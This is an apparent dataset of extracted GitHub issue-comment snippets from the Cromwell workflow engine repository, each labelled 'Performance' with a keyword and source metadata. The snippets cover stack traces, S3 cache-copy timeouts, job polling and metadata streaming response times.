https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutExcepti",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1103,perform,perform,1103,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,2,"['cache', 'perform']","['cached', 'perform']"
Performance,startRunnableScopes(WorkflowExecutionActor.scala:357); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.handleExecutionSuccess(WorkflowExecutionActor.scala:336); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.cromwell$engine$workflow$lifecycle$execution$WorkflowExecutionActor$$handleCallSuccessful(WorkflowExecutionActor.scala:314); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:97); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor$$anonfun$3.applyOrElse(WorkflowExecutionActor.scala:82); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:663); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowExecutionActor.scala:33); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.processEvent(WorkflowExecutionActor.scala:33); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:33); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107)```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-285679292:3831,concurren,concurrent,3831,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-285679292,4,['concurren'],['concurrent']
Performance,stem-akka.dispatchers.backend-dispatcher-86 ERROR - Google credentials are invalid: Connection reset; akka.actor.ActorInitializationException: akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-d86697f6-ca39-417b-b575-fc955c808983/WorkflowExecutionActor-d86697f6-ca39-417b-b575-fc955c808983/d86697f6-ca39-417b-b575-fc955c808983-EngineJobExecutionActor-DeliciousFileSpam.FileSpam:364:1/d86697f6-ca39-417b-b575-fc955c808983-BackendJobExecutionActor-d86697f6:DeliciousFileSpam.FileSpam:364:1/JesAsyncBackendJobExecutionActor: exception during creation; at akka.actor.ActorInitializationException$.apply(Actor.scala:174); at akka.actor.ActorCell.create(ActorCell.scala:607); at akka.actor.ActorCell.invokeAll$1(ActorCell.scala:461); at akka.actor.ActorCell.systemInvoke(ActorCell.scala:483); at akka.dispatch.Mailbox.processAllSystemMessages(Mailbox.scala:282); at akka.dispatch.Mailbox.run(Mailbox.scala:223); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Google credentials are invalid: Connection reset; at cromwell.filesystems.gcs.GoogleAuthMode$class.validateCredentials(GoogleAuthMode.scala:79); at cromwell.filesystems.gcs.ApplicationDefaultMode.validateCredentials(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.credential(GoogleAuthMode.scala:63); at cromwell.filesystems.gcs.ApplicationDefaultMode.credential(GoogleAuthMode.scala:137); at cromwell.filesystems.gcs.GoogleAuthMode$class.buildStorage(GoogleAuthMode.scala:94); at cromwell.filesystems.gcs.ApplicationDefaultMode.buildStorage(GoogleAuthMode.scala:137); at cromwell.backend.impl.jes.JesWorkflowPaths.<init>(JesWo,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719:1035,concurren,concurrent,1035,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1436#issuecomment-247787719,1,['concurren'],['concurrent']
Performance,"t copying (api: CreateMultipartUpload) doesn't work; > for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cac",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1656,cache,cache,1656,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance,"t needs to run Singularity. A container should almost be more like a hard coded binary step instead of a ""come into the environment and play around, the water's fine!"" It's a little bit like the ICD 10 decision to give a unique id to every combination of things (e.g., ""got hit on the road by a chicken"") instead of combinations of them, eg. (""got hit"" + ""by chicken""). The first is harder because you represent more things (more containers), but the second isn't reproducible because if you lose ""by chicken"" you've lost the entire workflow. Does that make sense?. ## What can/should we do now?. So there are two things to think about. With the current representation of a workflow, we would want Singularity to be OCI compliant, and I would propose a plan to move forward is to expect this, and contribute to Singularity itself with the mindset of ""I want this to plug into AWS"" or ""I want this to plug into Kubernetes,"" etc. The backends for HPC are going to be good to go with just a SLURM or SGE backend, and then commands to load and run/exec a Singularity container. When the time comes and Singularity supports services, then we can start to develop (I think) the singularity backend configuration for cromwell, with clean commands to get statuses, start and stop, and otherwise integrate into the software. You guys seem pretty busy, so likely your best bet would be to just wait, because the community is going in that direction anyway. The other representation is to rethink this. An approach that I like is to move away from micro managing the workflow / software, and to set requirements for the data. If you set standard formats (meaning everything from the organization of files down to the headers of a data file) on the data itself, then the software gets built around that. A researcher can have confidence that the data he is collecting will work with software because it's validated to the format. The developers can have confidence their tools will work with data because of that",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214:6027,load,load,6027,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2177#issuecomment-416418214,2,['load'],['load']
Performance,t scala.Option.foreach(Option.scala:257); at cromwell.engine.workflow.WorkflowActor$$anonfun$9.applyOrElse(WorkflowActor.scala:303); at cromwell.engine.workflow.WorkflowActor$$anonfun$9.applyOrElse(WorkflowActor.scala:288); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$$anonfun$handleTransition$1.apply(FSM.scala:606); at akka.actor.FSM$$anonfun$handleTransition$1.apply(FSM.scala:606); at scala.collection.immutable.List.foreach(List.scala:381); at akka.actor.FSM$class.handleTransition(FSM.scala:606); at akka.actor.FSM$class.makeTransition(FSM.scala:688); at cromwell.engine.workflow.WorkflowActor.makeTransition(WorkflowActor.scala:154); at akka.actor.FSM$class.applyState(FSM.scala:673); at cromwell.engine.workflow.WorkflowActor.applyState(WorkflowActor.scala:154); at akka.actor.FSM$class.processEvent(FSM.scala:668); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:154); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:799); at cromwell.engine.workflow.WorkflowActor.processEvent(WorkflowActor.scala:154); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.scala:657); at akka.actor.FSM$$anonfun$receive$1.applyOrElse(FSM.scala:651); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.engine.workflow.WorkflowActor.aroundReceive(WorkflowActor.scala:154); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265750486:3710,concurren,concurrent,3710,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1649#issuecomment-265750486,4,['concurren'],['concurrent']
Performance,t scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:69) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1$$anonfun$apply$5.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.Option.map(Option.scala:146) ~[scala-library-2.11.7.jar:1.0.0-M1]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at cromwell.jobstore.SqlJobStore$$anonfun$readJobResult$1.apply(SqlJobStore.scala:66) ~[classes/:na]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Try$.apply(Try.scala:192) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.util.Success.map(Try.scala:237) ~[scala-library-2.11.7.jar:1.0.0-M1]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[scala-library-2.11.7.jar:na]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[akka-actor_2.11-2.3.15.jar:na]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[scala-library-2.11.7.jar:na]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[akka-actor_2.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472:2460,concurren,concurrent,2460,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1349#issuecomment-242840472,1,['concurren'],['concurrent']
Performance,"t's bound to a session; > ; > Peter van 't Hof @ffinfo Aug 26 19:11; > but only have seen the dmraa implementation inside Gatk Queue; > ; > Peter van 't Hof @ffinfo Aug 26 19:28; > when using qstat i would use it only once for the complete pool instead executing it for each job; > so then you get an output like this:; > `; > job-ID prior name user state submit/start at queue slots ja-task-ID; > 9923549 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > 9923550 0.00000 cromwell_1 pjvan_thof qw 08/26/2016 17:23:16 1; > `; > this is only 2 jobs but having a lot of jobs this will reduce the load a lot; > ; > kshakir @kshakir Aug 26 21:21; > True, Cromwell will end up in an endless loop if someone terminates the SGE job, or if the rc file doesn’t appear in general. One could use isAlive intermittently, but it was introduced mainly for recovering jobs at re-startup, & I would not have isAlive poll as often as we check for the rc file. Btw, GATK Queue actually only checks drmaa every 30 seconds, so that it doesn’t overload dispatchers. Something like isAlive could be checked with similar frequency. All this is a bigger discussion that could be tracked in a git issue.; > Separately, I am hearing from multiple people that the rc poll logs are spam. ; > ; > Peter van 't Hof @ffinfo Aug 26 21:44; > As already suggested in the PR, a actor pool would be better I think but that's not a small change indeed; > mostly jobs are running way longer that 10 or 30 sec does not matter a lot ; > ; > Peter van 't Hof @ffinfo Aug 26 21:50; > On our cluster we need something like retries but if it goes to an endless loop he will never retry. In it's current state it's for us not yet usable but If you open to it I can think/test things then there is a improvement on this. I can even try to get some time to do some developing but that I can't promise directly. I can try to look into a lfs.drama backend. If it's possible to check running jobs after restart this would be nice to have, but ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348:1567,Queue,Queue,1567,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1346#issuecomment-242961348,1,['Queue'],['Queue']
Performance,"tDispatcher.scala:397); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.nio.file.NoSuchFileException: /home/pgrosu/me/cromwell/cromwell/cromwell-executions/w/2a89a995-aa89-4172-a5e1-1054cbccd9e0/call-hello/rc; at sun.nio.fs.UnixException.translateToIOException(UnixException.java:86); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:102); at sun.nio.fs.UnixException.rethrowAsIOException(UnixException.java:107); at sun.nio.fs.UnixFileSystemProvider.newByteChannel(UnixFileSystemProvider.java:214); at java.nio.file.Files.newByteChannel(Files.java:361); at java.nio.file.Files.newByteChannel(Files.java:407); at java.nio.file.Files.readAllBytes(Files.java:3149); at better.files.File.loadBytes(File.scala:80); at better.files.File.byteArray(File.scala:81); at better.files.File.contentAsString(File.scala:91); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply$mcI$sp(LocalBackend.scala:209); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply(LocalBackend.scala:208); at cromwell.engine.backend.local.LocalBackend$$anonfun$3.apply(LocalBackend.scala:208); at scala.util.Try$.apply(Try.scala:192); at cromwell.engine.backend.local.LocalBackend.cromwell$engine$backend$local$LocalBackend$$runSubprocess(LocalBackend.scala:207); ... 10 common frames omitted; [2016-01-31 16:37:29,45] [info] WorkflowActor [2a89a995]: persisting status of hello to Failed.; [2016-01-31 16:37:29,45] [info] WorkflowActor [2a89a995]: Beginning transition from Running to Failed.; [2016-01-31 16:37:29,59] [info] WorkflowActor [2a89a995]: transitioning from Running to Failed.; [2016-01-31 16:37:29,60] [info] SingleWorkflowRunnerActor workflow finished with status 'Failed'.; [2016-01-31 16",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887:5838,load,loadBytes,5838,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177622887,1,['load'],['loadBytes']
Performance,"ta from the database, we can still build the json from the strict set of events using an fs2 stream and stop that if/when needed. Another graph where Cromwell was asked to build several large metadata jsons:. ![screen shot 2018-10-19 at 1 17 28 pm](https://user-images.githubusercontent.com/2978948/47926437-ee57eb00-de96-11e8-89b4-a7df8db9e164.png); Red is non streaming, blue is streaming. ---; The main takeaway is that when **under memory pressure** (i.e when available memory is insufficient to build the requested metadata), streaming makes a significant difference on relieving the heap usage for medium to large (> 100K) metadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the overall response time is increasing significantly.; If Cromwell has sufficient memory to sustain the load then streaming does not give any real improvement.; The graph below shows memory usage with (v1s) and without streaming (v1) when Cromwell has enough memory to build all requests (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the conne",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:2634,load,load,2634,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['load'],['load']
Performance,"tadata. ### The less good. - Response time is not as good. The use cases above were specifically targeted towards trying to build large to very large metadata.; However when used in a more realistic scenario with lots of small sized metadata and few large ones, the overall response time is increasing significantly.; If Cromwell has sufficient memory to sustain the load then streaming does not give any real improvement.; The graph below shows memory usage with (v1s) and without streaming (v1) when Cromwell has enough memory to build all requests (in MB).; ![memory-v1-v1s](https://user-images.githubusercontent.com/2978948/48013920-818d5c80-e0f3-11e8-9f71-d4dedcbb2ba1.png). The graph below shows the average response time of the metadata endpoint with and without streaming (in ms).; ![metadata-200-v1-v1s](https://user-images.githubusercontent.com/2978948/48013852-53a81800-e0f3-11e8-9152-6c844e896b09.png). A plausible explanation of the response time increase is that the connection to the DB needs to remain open (and can't be re-used) for as long as the stream is not closed. This includes time spent pulling data out of the database AND building the JSON.; Whereas in the non streaming version, the connection can be re-used for another query as soon as all the data has been pulled and Cromwell is building the metadata. The extra time spent with the connection used in the streaming version can then delay subsequent requests when lots of metadata requests are being made.; We also see that the graph spans longer on the X axis for the streaming version, which means the test took longer to complete. [The test](https://github.com/broadinstitute/cromwell/blob/tj-metadata-stream-experiment-2/scripts/perf/test_cases/metadata_load/metadata_load.wdl) consists of sending a lot of metadata requests to Cromwell. ### Thoughts, possible next steps and/or things to try. - I think the fs2 stream model is still interesting as it allows for a clean interruption of building of the metadata (wi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806:3213,response time,response time,3213,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4124#issuecomment-435955806,1,['response time'],['response time']
Performance,"te from https://github.com/broadinstitute/cromwell/blob/33c58ef22b6a8edc4c1912c1416225c79d298f76/supportedBackends/sfs/src/main/scala/cromwell/backend/impl/sfs/config/ConfigAsyncJobExecutionActor.scala; which was tweaked since the last release in a change from @cjllanwarne (https://github.com/broadinstitute/cromwell/commit/33c58ef22b6a8edc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsync",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1177,concurren,concurrent,1177,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,"te(NetHttpRequest.java:94); at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:972); at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:241); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.aroundReceive(JesPollingActor.scala:22); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-28 14:37:35,25] [error] The JES polling actor Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$a#551868791] unexpectedly terminated while conducting 5 polls. Making a new one...; [2016-10-28 14:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.Par",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:4244,concurren,concurrent,4244,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"tem-akka.dispatchers.engine-dispatcher-49 INFO - WorkflowManagerActor Successfully started WorkflowActor-dd0b1399-ebb6-4d9b-89ea-7da193994220; 2018-06-07 12:16:52,353 cromwell-system-akka.dispatchers.engine-dispatcher-49 INFO - Retrieved 1 workflows from the WorkflowStoreActor; 2018-06-07 12:16:52,362 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - WorkflowStoreHeartbeatWriteActor configured to flush with batch size 10000 and process rate 2 minutes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); cats.effect.IO.$anonfun$unsafeToFuture$1$adapted(IO.scala:328); cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:98); cats.effect.internals.IORunLoop$.start(IORunLoop.scala:35); cats.effect.IO.unsafeRunAsync(IO.scala:257); cats.eff",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457:98993,concurren,concurrent,98993,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395480457,1,['concurren'],['concurrent']
Performance,"tes.; 2018-06-07 12:16:52,443 cromwell-system-akka.dispatchers.engine-dispatcher-47 INFO - MaterializeWorkflowDescriptorActor [UUID(dd0b1399)]: Parsing workflow as WDL draft-2; 2018-06-07 12:16:52,498 cromwell-system-akka.dispatchers.engine-dispatcher-47 ERROR - WorkflowManagerActor Workflow dd0b1399-ebb6-4d9b-89ea-7da193994220 failed (during MaterializingWorkflowDescriptorState): cromwell.engine.workflow.lifecycle.materialization.MaterializeWorkflowDescriptorActor$$anon$1: Workflow input processing failed:; Boxed Error; scala.concurrent.impl.Promise$.resolver(Promise.scala:83); scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); scala.concurrent.impl.Promise$DefaultPromise.tryComplete(Promise.scala:280); scala.concurrent.Promise.complete(Promise.scala:49); scala.concurrent.Promise.complete$(Promise.scala:48); scala.concurrent.impl.Promise$DefaultPromise.complete(Promise.scala:183); scala.concurrent.Promise.failure(Promise.scala:100); scala.concurrent.Promise.failure$(Promise.scala:100); scala.concurrent.impl.Promise$DefaultPromise.failure(Promise.scala:183); cats.effect.IO.$anonfun$unsafeToFuture$2(IO.scala:328); scala.util.Either.fold(Either.scala:189); cats.effect.IO.$anonfun$unsafeToFuture$1(IO.scala:328); 